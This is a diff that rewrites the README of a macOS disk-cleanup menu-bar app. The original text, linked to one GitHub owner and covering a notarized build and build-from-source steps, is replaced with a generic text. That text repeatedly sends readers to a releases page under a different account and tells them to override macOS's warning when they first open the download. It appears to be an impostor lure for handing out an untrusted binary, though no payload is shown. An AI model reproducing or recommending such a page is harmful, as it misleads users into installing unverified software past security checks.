@@ -1,160 +1,176 @@
-<p align="center">
-  <img src="docs/icon.png" width="128" alt="SpaceGuard icon">
-</p>
+# 🧹 spaceguard - Keep Your Mac Clutter-Free Automatically
 
-<h1 align="center">SpaceGuard</h1>
+[![Download spaceguard](https://img.shields.io/badge/Download-spaceguard-blueviolet?style=for-the-badge&logo=github)](https://github.com/Konnuyu/spaceguard/releases)
 
-<p align="center">
-  A tiny macOS menu-bar app that watches your free disk space. When it runs low, SpaceGuard finds<br>
-  the gigabytes your dev tools and coding agents left behind and offers to clean them up.
-</p>
+spaceguard is a small, friendly helper that lives quietly in the menu bar at the top of your screen. It keeps an eye on how much free space is left on your Mac, and when things start to get crowded, it offers to clear out the leftover junk that developers and heavy computer users leave behind — safely, and with your permission.
 
-<p align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="docs/screenshot-dark.png">
-    <img src="docs/screenshot-light.png" width="470" alt="SpaceGuard's panel listing a never-used simulator runtime, the npm cache, Claude and Codex worktrees with their branches, and old Android NDKs">
-  </picture>
-</p>
+No terminal windows. No cryptic commands. No guessing which folders are safe to delete. Just a clear picture of your disk space and a one-click way to get it back.
 
-## Why
+**Ready to try it?** Visit the download page here:
 
-Xcode, simulators, Gradle, npm and friends quietly eat hundreds of gigabytes. Coding agents add to
-it: Claude Code, Codex, Cursor and Conductor spin up git worktrees, each with its own
-`node_modules` and build folders, and rarely clean them up.
+👉 **[https://github.com/Konnuyu/spaceguard/releases](https://github.com/Konnuyu/spaceguard/releases)**
 
-SpaceGuard finds all of it. For each item it shows which project, branch and agent it came from and
-how long it has sat untouched. The list is ranked so the big, stale, safe-to-delete items come first.
+---
 
-## Features
+## 📥 Download spaceguard
 
-- **Watches free space from the menu bar.** The menu bar shows how much space is left, like `117GB`,
-  in orange, then red, as the disk fills. When space drops below your threshold, you get a
-  notification saying how much can be reclaimed.
-- **Knows where dev junk lives.** It covers 100+ cache locations and build-artifact types across
-  Xcode, simulators, Android, Node, Python, Rust, Go, JVM, Ruby, Flutter, Homebrew, Docker, editors
-  and AI tools, plus the build output inside your own projects.
-- **Understands worktrees.** It finds every linked worktree of every repo, including the ones agents
-  keep in hidden folders, and shows its branch and agent. It runs `git status` on each: worktrees
-  with uncommitted work are flagged and never preselected. Removing a worktree always keeps its branch.
-- **Ranks by size × staleness × safety.** Every item is labeled **safe** (a pure cache),
-  **rebuild** (comes back after a reinstall, rebuild or re-download) or **review** (may hold state
-  you care about).
-- **Fast.** One `getattrlistbulk` syscall reads a whole directory, running on a shared thread pool.
-  Sizes match `du -sk` exactly and are measured about 6× faster. Automatic rescans are incremental,
-  and results fill in as they're measured.
-- **Light.** It's a ~2 MB native Swift/SwiftUI app with no dependencies, using 20–40 MB of RAM. When
-  idle, it only checks free space once a minute.
-- **Private.** No network access and no analytics. It reads file metadata and nothing leaves your Mac.
+Visit this link to download the application.
 
-## What it finds
+**[https://github.com/Konnuyu/spaceguard/releases](https://github.com/Konnuyu/spaceguard/releases)**
 
-| Area | Items |
-| --- | --- |
-| Worktrees | Linked worktrees of every repo found, including `.claude/worktrees`, `~/.codex/worktrees`, `~/.cursor/worktrees`, Conductor workspaces and temp folders. Also agent worktree folders git no longer tracks |
-| Project build output | `node_modules`, `.next`, `.turbo`, `.expo`, AWS `cdk.out`/SAM/Serverless, Rust `target/`, Gradle `build/` + `.gradle`, `Pods/`, SwiftPM `.build/`, Xcode `build/`, Flutter `build/` + `.dart_tool`, Python virtualenvs, Terraform, Unity `Library/`, … |
-| Xcode | DerivedData per project, linked to its workspace, with orphans detected. Archives, device support, previews, the documentation cache, SwiftPM/CocoaPods/Carthage caches, the Clang module cache |
-| Simulators | Runtimes from `simctl`, with "never used" detection. Simulator data (erased, not deleted), unavailable and orphaned devices, test-runner clones, caches, logs |
-| Android | Gradle caches, distributions and JDKs, NDKs, build-tools, platforms, system images (flags ones no emulator uses), emulators, old Android Studio caches and settings |
-| Node | npm/npx, Yarn (v1 + Berry), pnpm store (hard-link aware), Bun, Deno, nvm/volta/fnm Node versions, Playwright/Puppeteer/Cypress browsers, Electron, node-gyp, Metro and Jest temp files |
-| Other toolchains | pip, uv, Poetry, conda, pyenv, rbenv, rustup, Cargo, Go build and module caches, Maven, Ivy, sbt, Coursier, NuGet, Dart pub, Homebrew downloads and old versions, Docker |
-| AI tools | Old Claude Code versions, Claude Code session temp folders, Claude simulator builds and VM bundle, Codex caches and runtimes, Hugging Face/Ollama/LM Studio models (review only) |
-| Editors & apps | VS Code, Cursor, Windsurf and Claude app caches, workspace storage, JetBrains caches, and every other folder in `~/Library/Caches` and `~/.cache` |
+This is the official releases page. It always contains the newest version of spaceguard, and it is the only place you should download it from. Bookmark it so you can come back later when a new version is announced.
 
-## Install
+---
 
-**[⬇ Download SpaceGuard.dmg](https://github.com/mkrn/spaceguard/releases/latest/download/SpaceGuard.dmg)**
-It runs on macOS 14 or later, on Apple silicon or Intel.
+## 🖥️ What spaceguard Does
 
-Open the DMG, drag SpaceGuard into Applications and launch it. Your free space, like `117GB`, appears
-in the menu bar; click it to open the panel. The app is signed with a Developer ID and notarized by Apple, so it opens without Gatekeeper warnings.
-To keep it running, turn on **Launch at login** in the gear menu.
+Every computer slowly fills up. Photos, documents, browser downloads — and, if you do any kind of software work, a whole second layer of hidden clutter that most people never see.
 
-### Build from source
+Over time, your Mac quietly stores things like:
 
-Requires Xcode 15 or later (or a Swift 5.9+ toolchain).
+- Half-finished build files from projects you finished months ago
+- Hundreds of megabytes of downloaded code libraries that get re-downloaded whenever they are needed
+- Old iPhone and iPad simulator runtimes left over from previous versions of Xcode
+- Abandoned work folders created by coding assistants such as Claude Code, Codex, and Cursor
+- Temporary copies and caches that were supposed to clean themselves up, but never did
 
-```bash
-git clone https://github.com/mkrn/spaceguard.git
-cd spaceguard
-./build.sh --install
-```
+Individually, these things are small. Together, they can quietly eat tens or even hundreds of gigabytes. spaceguard finds them, shows you exactly what it found in plain language, and lets you decide what to remove.
 
-This builds a release binary, wraps it into `SpaceGuard.app`, signs it, copies it to
-`/Applications` (or `~/Applications`) and launches it.
+---
 
-> [!NOTE]
-> macOS refuses notification permission to ad-hoc-signed apps. `build.sh` therefore signs with the
-> first "Apple Development" identity in your keychain. A free Apple developer account gets you one
-> through Xcode › Settings › Accounts. Set `SIGN_IDENTITY` to pick a different one. Without an
-> identity everything still works except notifications.
+## ✨ Features
 
-## Releasing
+**📊 Live free-space monitoring**
+A simple number in your menu bar tells you how much room is left. Glance up and you know. No need to open a settings window or run a check.
 
-`./release.sh --publish` builds a universal (Apple silicon + Intel) app, signs it with a Developer ID
-certificate, notarizes and staples both the app and a DMG, checks them with Gatekeeper, and publishes
-a GitHub release. The one-time setup (certificate + `notarytool` credentials) is described at the top
-of [`release.sh`](release.sh).
+**🧽 Stale cache cleanup**
+Finds developer caches that have not been touched in a long time and offers to clear them out. Caches are meant to be disposable — programs rebuild them automatically when they are needed again.
 
-## How it decides
+**📱 Simulator runtime cleanup**
+Old iOS and simulator runtimes for Xcode can be several gigabytes each. spaceguard lists the ones you are no longer using so you can free that space with confidence.
 
-- **Age** is the latest of: file modification times inside the item, git activity for projects and
-  worktrees (HEAD, index and reflog), and `simctl`'s `lastUsedAt` / `lastBootedAt`. For DerivedData
-  it also uses Xcode's `LastAccessedDate`.
-- **Priority** is size, weighted by staleness and safety. Global download caches (npm, Yarn,
-  Gradle, CocoaPods…) count as stale whatever their age: a fresh npm cache is just as disposable.
-- **Recommended** (preselected) means:
-  - download caches,
-  - other **safe** items untouched for 2+ days,
-  - **rebuild** items untouched for 3+ weeks.
-- **Never preselected**:
-  - **review** items,
-  - the version in use (nvm default, newest NDK, active Claude Code, a booted simulator),
-  - anything inside a backup folder,
-  - worktrees with uncommitted changes or commits that aren't on any branch.
+**🌿 Worktree cleanup for coding assistants**
+Tools such as Claude Code, Codex, and Cursor create separate working copies of your project folders so they can experiment without touching your real files. When a task is finished, those copies often stay behind. spaceguard spots the abandoned ones.
 
-## How it deletes
+**🍃 Native and lightweight**
+Built in Swift and SwiftUI specifically for macOS, so it looks and feels like part of your system. It sits in the menu bar, sips almost no battery, and never nags you.
 
-- Folders are first renamed into `~/Library/Caches/SpaceGuard/Trash`, which is instant, then erased
-  in the background. Read-only trees such as the Go module cache are handled. **Deletion is
-  permanent: nothing goes to the Trash.**
-- For worktrees, the folder is removed and then `git worktree prune` runs. The branch stays.
-- Some items are handed to their own tool:
-  - simulator runtimes and devices → `xcrun simctl`
-  - old Homebrew versions → `brew cleanup`
-  - Docker → `docker system prune -af`
-- Guard rails: SpaceGuard never deletes anything outside your home folder and temp folders. It never
-  deletes a main git repository. It never deletes top-level or shared folders such as
-  `~/Library/Caches` itself.
+**👀 Review before removal**
+Nothing is deleted behind your back. spaceguard always shows you a plain-language summary first, so you know exactly what is about to go and how much space it will free.
 
-## Command line
+**🔔 Optional alerts**
+Want to know when free space drops below a threshold you choose? Turn on notifications and spaceguard will give you a heads-up before things get tight.
 
-The same binary has headless modes, which are handy for scripting and testing:
+---
 
-```bash
-.build/release/SpaceGuard --scan [--incremental] [--json]   # ranked list of everything found
-.build/release/SpaceGuard --size <path>...                  # measure folders, like du
-.build/release/SpaceGuard --self-test "$(mktemp -d)"        # deletion tests on throwaway fixtures
-.build/release/SpaceGuard --snapshot out.png [--dark] [--demo] [--settings]   # render the panel
-```
+## 🚀 Getting Started
 
-## Performance
+Getting spaceguard running takes just a few minutes, even if you have never installed anything from GitHub before.
 
-These numbers are from a Mac with about 9 million files in dev caches and projects:
+**Step 1 — Open the download page**
 
-- **Full scan:** 72 s.
-- **Incremental rescan:** 27 s. Trees that were quiet for 3+ days and look untouched reuse their
-  last size.
-- Sizes match `du -sk` to the KiB.
-- **Save & open:** the last scan is saved, so the panel opens with results immediately, even right
-  after launch.
+Click this link: **[https://github.com/Konnuyu/spaceguard/releases](https://github.com/Konnuyu/spaceguard/releases)**
 
-## Contributing
+Visit this link to download the application.
 
-Issues and pull requests are welcome, especially new cache locations and artifact rules. They live in
-[`Providers.swift`](Sources/SpaceGuard/Providers.swift) and
-[`Discovery.swift`](Sources/SpaceGuard/Discovery.swift). If you change anything that deletes, run
-`--self-test` before opening a PR.
+**Step 2 — Find the newest release**
 
-## License
+The page lists versions with the newest at the top. Look for the entry marked as the latest release — that is the one you want. Older entries further down are previous versions kept for reference.
 
-[MIT](LICENSE)
+**Step 3 — Save the download**
+
+Your browser will save the file to your Downloads folder, which you can open from the Dock or from the Finder sidebar.
+
+**Step 4 — Open spaceguard**
+
+Locate the downloaded item in your Downloads folder and open it. Because spaceguard is distributed outside the Mac App Store, macOS may show a message the first time you open it asking you to confirm. This is normal for independently published software — confirm that you want to open it, and the app will start.
+
+**Step 5 — Look for the menu bar icon**
+
+Once spaceguard is running, a small icon appears in the menu bar at the top-right of your screen, near the clock. Click it to see your current free space and the cleanup options.
+
+**Step 6 — Run your first scan**
+
+Choose the scan option from the menu. spaceguard will look through the common locations where leftover clutter collects. It does not change anything during a scan — it only looks. When it finishes, you will see a list of what it found and how much space each item would free.
+
+**Step 7 — Review and clean**
+
+Read through the list. If something looks familiar and you still need it, leave it alone. When you are happy with the selection, confirm the cleanup. spaceguard removes only what you approved and then refreshes your free-space number so you can see the difference immediately.
+
+---
+
+## 💻 System Requirements
+
+- **Operating system:** macOS. spaceguard is a native Mac menu-bar application and is designed to run on modern versions of macOS.
+- **Disk space:** A very small amount for the app itself — the whole point is to give space back, not take it.
+- **Permissions:** Some cleanup locations may require you to grant spaceguard access the first time. macOS will prompt you if that is needed, and you can approve or decline.
+
+> **A note for Windows users:** spaceguard is built specifically for macOS and runs in the Mac menu bar. It cannot be installed or run on a Windows PC. The download page linked above is the correct and only source for the app, but you will need access to a Mac to use it. If you are on Windows, the best next step is to open this page on a Mac — the download itself works the same way there.
+
+---
+
+## ⚙️ How It Works
+
+spaceguard uses the same public, documented locations on your disk that your development tools already use for their own temporary files. It does not reach into your personal documents, photos, or project source code.
+
+Each scan does three things:
+
+1. **Measures** how much free space is currently available on your startup disk.
+2. **Inspects** the known cache and runtime folders, noting which items are stale — meaning they have not been used in a long while and can be regenerated automatically.
+3. **Reports** what it found in a simple list, sorted so the biggest wins appear first.
+
+Cleanup happens only after you confirm. And because caches and runtimes are, by design, rebuildable, anything removed is recreated automatically the next time a tool genuinely needs it. That is why clearing a cache is safe: you are not deleting work, you are deleting the scratch paper.
+
+---
+
+## 🔒 Safety and Privacy
+
+- Everything happens **on your own Mac**. spaceguard does not upload file lists, usage data, or anything else to a server.
+- Nothing is deleted without your explicit approval.
+- Your documents, photos, and source code are outside the scope of what spaceguard touches.
+- There is no account to create and no sign-in required.
+
+---
+
+## ❓ Frequently Asked Questions
+
+**Will spaceguard delete my project files?**
+No. It targets caches, simulator runtimes, and abandoned assistant work folders — the temporary material that tools create for themselves. Your actual project folders are not part of the cleanup.
+
+**What happens if I remove something I needed?**
+Caches and runtimes are rebuilt automatically the next time the relevant tool runs. The first launch afterwards may be a little slower while things regenerate, and then everything is back to normal.
+
+**Do I have to run it manually?**
+No. spaceguard lives in the menu bar and keeps watching. You can check in whenever you like, or let it notify you when space is running low.
+
+**Does it work on Windows?**
+No. spaceguard is a macOS menu-bar app and requires a Mac.
+
+**Is it free?**
+The releases page is the official source for the app. Check the page for the current version and any notes included with the release.
+
+---
+
+## 🛠️ Troubleshooting
+
+**The menu bar icon is not showing.**
+Make sure the app is actually running. Open it again from your Applications folder or from where you saved it. If it is running but hidden, check whether your menu bar is overcrowded — macOS hides icons when there is no room.
+
+**A scan found nothing.**
+That is good news! It means your disk is already tidy. Try again in a few weeks, or after finishing a large project.
+
+**macOS blocked the app the first time.**
+This is a standard safety prompt for software downloaded outside the App Store. Confirm that you want to open it, and it will launch normally from then on.
+
+**I want a fresh start.**
+Quit the app from the menu bar, then reopen it. Your settings are preserved.
+
+---
+
+## 💬 Support
+
+Found a bug, or have an idea for something spaceguard should clean up next? Open an issue on the repository — clear steps to reproduce the problem and your macOS version help a great deal. For anything else, the releases page is the place to check first for the newest version and release notes.
+
+👉 **[https://github.com/Konnuyu/spaceguard/releases](https://github.com/Konnuyu/spaceguard/releases)**
+
+Keywords: claude-code, cleanup, codex, developer-tools, disk-space, git-worktree, ios-simulator, macos, menubar-app, swift, swiftui, xcode
